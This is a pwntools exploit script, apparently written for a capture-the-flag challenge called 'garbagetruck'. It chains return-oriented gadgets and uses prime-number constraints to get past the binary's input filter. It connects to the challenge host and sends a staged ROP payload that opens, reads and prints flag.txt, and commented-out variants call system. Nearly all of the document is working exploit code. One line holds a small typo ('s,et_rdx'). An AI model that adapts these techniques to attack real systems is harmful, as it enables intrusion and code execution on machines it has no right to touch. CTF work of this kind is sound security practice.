from pwn import *
import random
import sys

context.bits = 64
context.arch = "amd64"
context.endian ="little"

def rabinMiller(num):
    # Returns True if num is a prime number.

    s = num - 1
    t = 0
    while s % 2 == 0:
        # keep halving s while it is even (and use t
        # to count how many times we halve s)
        s = s // 2
        t += 1

    for trials in range(5): # try to falsify num's primality 5 times
        a = random.randrange(2, num - 1)
        v = pow(a, s, num)
        if v != 1: # this test does not apply if v is 1.
            i = 0
            while v != (num - 1):
                if i == t - 1:
                    return False
                else:
                    i = i + 1
                    v = (v ** 2) % num
    return True


def isPrime(num):
    # Return True if num is a prime number. This function does a quicker
    # prime number check before calling rabinMiller().

    if (num < 2):
        return False # 0, 1, and negative numbers are not prime

    # About 1/3 of the time we can quickly determine if num is not prime
    # by dividing by the first few dozen prime numbers. This is quicker
    # than rabinMiller(), but unlike rabinMiller() is not guaranteed to
    # prove that a number is prime.
    lowPrimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997]

    if num in lowPrimes:
        return True

    # See if any of the low prime numbers can divide num
    for prime in lowPrimes:
        if (num % prime == 0):
            return False

    # If all else fails, call rabinMiller() to determine if num is a prime.
    return rabinMiller(num)


def write_mem(addr, val):
    # 0x00000000004380a1 : mov dword ptr [rdi + 0x10], esi ; ret

    return ''.join([
        set_rdi(addr-0x10),
        set_rsi(val),
        p64(0x00000000004380a1),
    ])

def set_rsi(val):
    return ''.join([
        p64(0x0000000000406afb),
        p64(val),
    ])

def zf():
    # 0x000000000044ae23 : xor eax, eax ; add rsp, 8 ; ret
    return ''.join([
        p64(0x000000000044ae23),
        p64(0x1337),
        
    ])

def set_r12(val):
    return flat(0x000000000048e25b, val)


def set_rax_1():
# 0x000000000048e9f9 : mov eax, 1 ; ret
    return flat(0x000000000048e9f9)

def set_rcx(val):
    # 0x00000000004faa77 : pop rcx ; jne 0x4faadb ; ret
    return flat(
            0x00000000004faa77,
            val,
        )


def set_rcx_and_others(rcx, rbx=0x1337, rbp=0x1337, r12=0x1337, r13=0x1337, r14=0x1337):
    return flat(
            0x0000000000448a7b, # : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
            rcx,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            )


def inc_rcx():
    return flat(0x00000000004b9341)

def jmp_rcx():
    return p64(0x000000000044bc1f)

write_addr = 0x401820
def write():
    write_addr = 0x401820
    return flat(set_rcx(write_addr - 29), inc_rcx() * 29, jmp_rcx())

def set_eax_1():
    # 0x000000000041a3dd : mov dl, 0x66 ; nop ; mov eax, 1 ; ret
    return flat(
        0x000000000041a3dd
    )

pop_ret_fuck_r13 = 0x00000000004432c7 #  : pop r13 ; ret

def set_rdi_from_rax():
    return flat(
        set_r12(pop_ret_fuck_r13),
    # 0x00000000004a8d65 : lea rsi, qword ptr [rsp + 0x10] ; mov rdi, rax ; call r12
        0x00000000004a8d65,
    )
def set_rdi_1():
    return flat(
        set_eax_1(),
        set_rdi_from_rax(),
    )

def set_rdx_rsp():
    # 0x00000000004a0a61 : mov rsi, rsp ; call rax
    return flat(
        set_rax(pop_ret_fuck_r13),
        0x00000000004a09db, # : mov rdx, rsp ; call rax
       )    

def set_rsi_rsp():
    # 0x00000000004a0a61 : mov rsi, rsp ; call rax
    return flat(
        set_rax(pop_ret_fuck_r13),
        0x00000000004a0a61, # : mov rsi, rsp ; call rax
    )    

def set_rdi(val):
    return ''.join([
        p64(0x0000000000403043),
        p64(val),
    ])

def set_rbp(val):
    return flat(0x00000000004847d7, val)

def set_rdx(val):
#0x000000000049411f : and al, 0x28 ; mov rdx, rbp ; call r12
    return flat(set_r12(pop_ret_fuck_r13), set_rbp(val), 0x000000000049411f)


#0x000000000049809d : and al, 0x20 ; mov rdx, rax ; call r15
#0x0000000000496a23 : and al, 0x38 ; mov rdx, rax ; call r15
#0x000000000046e1bd : movsxd rdx, eax ; call rbx

# 0x000000000040c265 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000496a6b : and al, 0x10 ; mov rdi, rbp ; call r15


# 0x000000000046e523 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
# 0x0000000000453a87 : add ecx, ebp ; ret


# 0x000000000043f4f5 : add esp, 0x10 ; pop rbx ; ret
# 0x000000000053baf3 : jmp rbx
#0x00000000004acbab : add eax, 0x28c48348 ; ret
#0x0000000000406bd7 : add eax, 0x34fbd4 ; mov qword ptr [rsi], rax ; ret
#0x0000000000406c63 : add eax, 0x352c28 ; mov qword ptr [r8], rax ; ret
#0x000000000050fcf5 : add eax, 0x3f168143 ; hlt ; and al, 0x68 ; xchg eax, edi ; ret
#0x0000000000426a3d : add eax, 0xd1c40141 ; ret 0xf321
#0x000000000052cbad : add eax, 0xe2440002 ; cmc ; jmp rsp
#0x0000000000505283 : add eax, 0xf2b8c405 ; and ecx, dword ptr [rax - 0x56] ; ret 0x426d
#0x00000000004148d7 : add eax, 0xf3fffffd ; ret

#0x0000000000421d8d : add byte ptr [rax], r8b ; mov rax, qword ptr [rdi] ; ret
#0x000000000041a313 : je 0x41a326 ; mov rax, qword ptr [rdi + 0x58] ; ret
#0x000000000041d0a3 : je 0x41d0b6 ; mov rax, qword ptr [rdi + 0x38] ; ret
#0x000000000047b3d3 : je 0x47b3e5 ; mov rax, qword ptr [rdi] ; ret
#0x000000000044b0db : jne 0x44b0c9 ; mov rbp, qword ptr [rax] ; mov rdi, qword ptr [rax + 8] ; call rcx

#0x0000000000406b49 : cld ; xor al, 0 ; mov qword ptr [rdx], rax ; ret




def add_deref_addr_pAh(addr, val):

#0x00000000004adec3 : add dword ptr [rbp + 0xa], esi ; ret
    return flat(
            set_rbp(addr),
            set_rsi(val),
            0x00000000004adec3,
            )
    

def store_rax(addr):
    # 0x00000000004713e5 : mov qword ptr [rsi], rax ; ret
    return flat(
            set_rsi(addr),
            0x00000000004713e5,
            )

def read_rax_deref_rax_m8():
    return flat(0x0000000000478e13)
    #0x0000000000478e13 : mov rax, qword ptr [rax + 8] ; ret

def add_al_f3():
    return flat(0x40605b)

def mov_eax_edx():
    #0x00000000004b817f : add rsp, 8 ; mov eax, edx ; ret
    return flat(
            0x00000000004b817f,
            0x1337,
            ) 

def set_eax(val):
    return flat(
        s,et_rdx(val),
        mov_eax_edx(),
        )

def read_close_ptr_rax():
    ## inc f3 3 times to get close_got - 8
    close_got = 0x756108
    read_close_addr = 0x756127
    return flat(set_eax(read_close_addr), add_al_f3() * 3, read_rax_deref_rax_m8())

def read_scanf_ptr_rax():
    ## inc f3 3 times to get close_got - 8
    scanf_got = 0x756200
    scanf_close_addr = 0x7560b5
    return flat(set_eax(scanf_close_addr), add_al_f3() * 9, read_rax_deref_rax_m8())

system_addr = 0x756035
update_addr = 0x75602b

def add_addr_val(addr, val):
    assert isPrime(addr - 0xa)
    val += 2**32
    val &= (2**32 - 1)
    nums = []
    m = 0
    while sum(nums) < val:
        #print hex(val), [hex(n) for n in nums]
        #print 'starting from', m
        for i in xrange(m, val - sum(nums)):
            if isPrime(val - sum(nums) - i):
                nums.append(val - sum(nums) - i)
                m = 0
                break
        else:
            t = nums.pop()
            m = val - sum(nums) - t + 1
            #print "bad, popping"

    #print hex(val), [hex(n) for n in nums]
    return flat(
            flat([add_deref_addr_pAh(addr - 0xa, n) for n in nums]),
        )

def write_dword_prime_addr(addr, val):
    assert isPrime(addr) 

    return flat(
            zf(),
            store_rax(addr),
            add_addr_val(addr, val),
        )

def set_r15(val):
    #0x0000000000403dc9 : pop r15 ; ret
    return flat(
            0x0000000000403dc9,
            val,
            )

def write_qword(addr, val):
    #0x000000000045d261 : mov dword ptr [rdi + 0x10], esi ; mov qword ptr [rdi + 0x18], r15 ; ret
    return flat(
            set_rdi(addr - 0x18),
            set_r15(val),
            0x000000000045d261,
            ) 



#rop = p64(0x2) * 27 + set_rsi_rsp() + set_rdi_1() + set_rdx(0x8003) + write() + p64(0x1337) * 10
#rop = p64(2) * 27 + read_close_ptr_rax() + store_rax(system_addr) + add_deref_addr_pAh(update_addr, 0xffff9867 - 14) + add_deref_addr_pAh(update_addr, 7) * 2 + p64(0x1337) * 10
#rop = p64(2) * 27 + read_close_ptr_rax() + store_rax(system_addr) + add_deref_addr_pAh(update_addr, 0xfff4dab0 - 25) + add_deref_addr_pAh(update_addr, 7) * 3 + add_deref_addr_pAh(update_addr, 2) * 2 + p64(0x1337) * 10
#0x000000000045cbe7 : mov qword ptr [rdi + 0x18], r9 ; ret

#0x00000000004051bd : pop rbx ; ret
#0x0000000000440225 : mov rdi, qword ptr [rbx] ; call rax

#0x00000000004c39db : xchg eax, ebx ; ret
#0x000000000045150b : mov dword ptr [rdi + 0x18], eax ; ret


def set_rax(val):
    return flat(
        set_rdx(val),
        0x000000000040fda5, # : adc edx, 0 ; mov r10, rdx ; mov rax, r10 ; ret
    )

def load_edi(addr):
    return flat(
            set_rax(pop_ret_fuck_r13),
            set_rdi(addr),
            0x00000000004a6063, # mov edi, dword ptr [rdi] ; call rax
            )

def read_rax(addr):
    #0x0000000000421ec5 : mov rax, qword ptr [rdi] ; ret
    return flat(
            set_rdi(addr),
            0x0000000000421ec5,
            )


def mov_rbx_rax():
    #0x00000000004202b3 : mov rbx, rax ; jne 0x4202a6 ; pop rbx ; ret
    return flat(0x00000000004202b3, 0x1337)

def infloop():
    return flat(0x000000000040642f, 0x000000000043b811, 0x000000000043b811)

stringbuf = 0x756427
#rop = flat(
#        p64(2) * 27,
#        read_close_ptr_rax(),
#        store_rax(system_addr),
#        add_addr_val(system_addr, 0xfff4dab0),
#        #write_qword(stringbuf, 0x2a20746163),
#        write_qword(stringbuf, u64(('env #34').ljust(8, '\x00'))),
#        read_rax(system_addr),
#        set_rdi(stringbuf),
#        0x000000000043b811, # jmp rax
#        0x000000000040642f, 0x000000000043b811, 0x000000000043b811, # : jmp rax
#)
#
#rop = flat(
#        p64(2) * 27,
#        read_scanf_ptr_rax(),
#        store_rax(system_addr),
#        set_rdi_1(),
#        set_rsi(system_addr),
#        set_rdx(13),
#        write(),
#        p64(0x1337) * 1
#)


def wwwd(addr, val):
    tmp0 = 0x75717b
    tmp1 = 0x75726b

    return flat(
        write_dword_prime_addr(tmp0, val),
        write_dword_prime_addr(tmp1, addr - 0x18),
        read_rax(tmp0),
#0x00000000004c39db : xchg eax, ebx ; ret
        0x00000000004c39db, # : xchg eax, ebx ; ret
        load_edi(tmp1),
        0x00000000004c39db, # : xchg eax, ebx ; ret
        0x000000000045150b, #: mov dword ptr [rdi + 0x18], eax ; ret
        )

def wwwq(addr, val):
    return wwwd(addr, u32(p64(val)[:4])) + wwwd(addr + 4, u32(p64(val)[4:]))

def set_r14(val):
    return flat(
            0x000000000049920d, # : pop r14 ; ret
            val,
            )

def set_rsi(val):
    return flat(
        set_r12(val),
        set_r14(pop_ret_fuck_r13),
        0x000000000043f9e7, # : mov rsi, r12 ; call r14
        )
    
#0x000000000049bf7d : pop rsp ; ret
open_addr = 0x401AD0
read_addr = 0x401940
write_addr = 0x401820
base = 0x756800

def stack_pivot(val):
    pass
    # rbp <- rax/rdi
    # leave

def debug():
    return p64(0x0000000000402115) # : ret


libc = ELF("libc.so.6")

#rop = flat(
#        p64(2) * 27,
#        read_close_ptr_rax(),
#        store_rax(system_addr),
#        add_addr_val(system_addr, libc.symbols["mprotect"] - libc.symbols["close"]),
#        rop2(base),
#        wwwd(base - 9, base - 8),
#        load_edi(base - 9),
#        set_rax(pop_ret_fuck_r13),
#        0x000000000043c585, # : mov rbp, rdi ; lea rdx, qword ptr [rsp + 0x10] ; call rax
#        0x0000000000507a37, #: leave ; xor al, 0x35 ; or eax, 0xed2a2bf9 ; ret
#        p64(0x1337) * 5,
#)

rop = flat(
        p64(2) * 27,
        set_rcx_and_others(read_addr - 7),
        inc_rcx() * 7,
        set_rdi_1(),
        set_rsi_rsp(),
        set_rdx(499),
        debug(),
        jmp_rcx(),
)

def set_rdx2(val):
    return flat(0x00000000004f67f5, val)

def set_rsi2(val):
    return flat(0x0000000000402759, val)

def tonums(buf):
    nums = [u64(buf[i:i+8]) for i in xrange(0, len(buf), 8)]


    return nums

#r = process("./garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65")
#gdb.attach(r , """
#b *0x401ED0
#commands
#    record full
#end
#b *0x0000000000402115
#""")
r = remote("garbagetruck.chal.pwning.xxx", 6349)

context.log_level = 'debug'
nums = tonums(rop)
for n in nums:
    print hex(n)
    assert isPrime(n)
for n in tonums(rop):
    r.sendlineafter("Pitch", str(n))
r.sendlineafter("Pitch", str(0))
r.recvuntil("Compacted garbage looks like")
r.recvline()
urop = flat([
    debug() * 8,
    0x000000000041a318, # : pop rax ; ret
        0x000000000040763f, # : add rsp, 0x20 ; pop rbx ; ret

    0x0000000000401ceb, # : mov rbp, rsp ; call rax
    ## this will be in rbp
    "flag.txt\x00".ljust(0x18),
    pop_ret_fuck_r13, # rbx
    0x000000000043c647, # : mov rdi, rbp ; call rbx
    set_rsi2(0),
    0x401AD0, # open
    set_rdi(0),
    set_rsi2(base),
    set_rdx2(64),
    read_addr,
    set_rdi(1),
    set_rsi2(base),
    set_rdx2(64),
    write_addr,
    infloop(),
    ])

print '\n'.join(['set *($rsi + {:d}*8) = {:#x}'.format(i,n) for i,n in enumerate(tonums(urop))])
print '\n'.join(['set *($rsi + {:d}*8 + 4) = {:#x}'.format(i,n >> 32) for i, n in enumerate(tonums(urop))])
r.sendline(urop)

r.interactive()

